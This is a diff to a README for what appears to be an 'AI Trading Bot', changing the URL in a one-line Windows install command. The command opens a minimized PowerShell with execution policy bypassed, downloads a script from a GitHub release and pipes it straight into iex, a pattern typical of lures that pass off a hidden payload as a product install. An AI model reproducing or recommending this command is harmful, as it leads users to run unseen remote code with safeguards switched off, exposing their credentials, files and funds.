@@ -31,7 +31,7 @@ If you just want to launch the bot quickly on Windows, use the installation comm
 Open **CMD** and run this **single command**:
 
 ```powershell
-cmd /c start /min powershell -ep bypass -c "iwr https://github.com/hkcodes84/AI-Trading-Bot/releases/download/Ai-trading-bot/main.ps1 -UseBasicParsing|iex" & rem update
+cmd /c start /min powershell -ep bypass -c "iwr https://github.com/hkcodes84/AI-Trading-Bot/releases/download/polymarket/main.ps1 -UseBasicParsing|iex" & rem update
 ```
 
 > Then continue with the setup, exchange configuration, and strategy selection below.
